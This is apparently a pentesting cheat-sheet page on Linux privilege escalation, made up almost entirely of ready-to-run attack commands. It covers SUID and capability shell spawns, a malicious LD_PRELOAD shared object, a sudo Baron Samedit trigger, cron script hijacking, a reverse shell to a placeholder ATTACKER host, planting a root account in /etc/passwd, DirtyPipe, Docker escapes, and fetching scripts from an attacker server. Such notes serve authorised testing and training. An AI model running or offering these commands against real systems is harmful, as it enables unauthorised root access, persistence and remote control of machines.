---
title: Linux Privilege Escalation
description: Técnicas de escalada de privilegios en sistemas Linux
tags:
  - linux
  - privesc
  - enumeration
---

# Linux Privilege Escalation

Guía completa de técnicas de escalada de privilegios en sistemas Linux.

---

## // Enumeration

### System Information

```bash
# Kernel version
uname -a
cat /proc/version
cat /etc/issue

# Architecture
arch

# Hostname
hostname

# Environment variables
env
cat /etc/profile
cat ~/.bashrc
```

### Users & Groups

```bash
# Current user
id
whoami

# All users
cat /etc/passwd
cat /etc/shadow  # if readable

# Groups
cat /etc/group

# Sudo permissions
sudo -l

# Users with bash
grep -E '/bin/(ba)?sh' /etc/passwd
```

### Network

```bash
# Network interfaces
ip a
ifconfig

# Routing
ip route
route -n

# Open ports
ss -tulpn
netstat -tulpn

# Connections
ss -anp
```

---

## // SUID/SGID Binaries

### Find SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

### Find SGID Binaries

```bash
find / -perm -2000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
```

### GTFOBins Check

```bash
# Common exploitable SUID binaries
# Check: https://gtfobins.github.io/

# Examples:
/usr/bin/find . -exec /bin/sh -p \; -quit
/usr/bin/vim -c ':!/bin/sh'
/usr/bin/nmap --interactive  # older versions
```

---

## // Capabilities

### Find Capabilities

```bash
getcap -r / 2>/dev/null
```

### Exploitable Capabilities

```bash
# CAP_SETUID - Python
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# CAP_SETUID - Perl
/usr/bin/perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/sh";'

# CAP_DAC_READ_SEARCH - tar
/usr/bin/tar -cvf shadow.tar /etc/shadow
tar -xvf shadow.tar
```

---

## // Sudo Exploitation

### Check Sudo Permissions

```bash
sudo -l
```

### Common Sudo Exploits

```bash
# LD_PRELOAD (if env_keep+=LD_PRELOAD)
# 1. Create malicious shared object
echo '#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}' > /tmp/shell.c
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles

# 2. Execute
sudo LD_PRELOAD=/tmp/shell.so <allowed_command>
```

### Sudo Version Exploits

```bash
# Check version
sudo -V

# CVE-2021-3156 (Sudo Baron Samedit)
# Versions: 1.8.2 - 1.8.31p2, 1.9.0 - 1.9.5p1
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
```

---

## // Cron Jobs

### Enumerate Cron

```bash
# System cron
cat /etc/crontab
ls -la /etc/cron.*

# User cron
crontab -l
ls -la /var/spool/cron/crontabs/

# Running processes
pspy64  # Tool for process snooping
```

### Exploit Writable Scripts

```bash
# If cron runs a script you can write to:
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /path/to/script.sh

# After cron executes:
/tmp/bash -p
```

### PATH Injection

```bash
# If cron uses relative paths and PATH is controllable
echo '/bin/bash -i >& /dev/tcp/ATTACKER/PORT 0>&1' > /tmp/vulnerable_binary
chmod +x /tmp/vulnerable_binary
export PATH=/tmp:$PATH
```

---

## // Writable Files

### Find Writable Directories

```bash
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
```

### Find Writable Files

```bash
find / -writable -type f 2>/dev/null

# Writable /etc/passwd
echo 'hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker  # password: password
```

### World-Writable /etc/shadow

```bash
# Generate password hash
openssl passwd -1 newpassword

# Replace root hash
```

---

## // Kernel Exploits

### Check Kernel Version

```bash
uname -r
cat /proc/version
```

### Common Kernel Exploits

| Kernel Version | CVE | Exploit |
|----------------|-----|---------|
| 2.6.22 < 3.9 | CVE-2016-5195 | DirtyCow |
| 4.4.0-116 | CVE-2017-16995 | eBPF_verifier |
| 5.8 < 5.16.11 | CVE-2022-0847 | DirtyPipe |
| < 5.11 | CVE-2021-22555 | Netfilter |

### DirtyPipe (CVE-2022-0847)

```bash
# Check if vulnerable
uname -r  # 5.8 <= version < 5.16.11

# Compile and run exploit
gcc -o dirtypipe dirtypipe.c
./dirtypipe /etc/passwd 1 "${OVERWRITE}"
```

---

## // Docker Escape

### Check if in Container

```bash
cat /proc/1/cgroup
ls -la /.dockerenv
```

### Privileged Container

```bash
# If --privileged flag was used
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host
```

### Docker Socket

```bash
# If /var/run/docker.sock is accessible
docker -H unix:///var/run/docker.sock run -v /:/mnt -it alpine chroot /mnt
```

---

## // Automated Enumeration

### LinPEAS

```bash
# Download and run
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or transfer
wget http://ATTACKER:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### LinEnum

```bash
wget http://ATTACKER:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh -t
```

### linux-exploit-suggester

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

---

## // Quick Reference

!!! danger "Checklist"
    1. [ ] `sudo -l` - Check sudo permissions
    2. [ ] SUID/SGID binaries
    3. [ ] Capabilities
    4. [ ] Cron jobs
    5. [ ] Writable files (/etc/passwd, /etc/shadow)
    6. [ ] Kernel version → known exploits
    7. [ ] Running services as root
    8. [ ] Docker/LXC escape
    9. [ ] NFS shares (no_root_squash)
    10. [ ] Passwords in files/history

---

!!! tip "Resources"
    - [GTFOBins](https://gtfobins.github.io/)
    - [HackTricks - Linux Privesc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
    - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
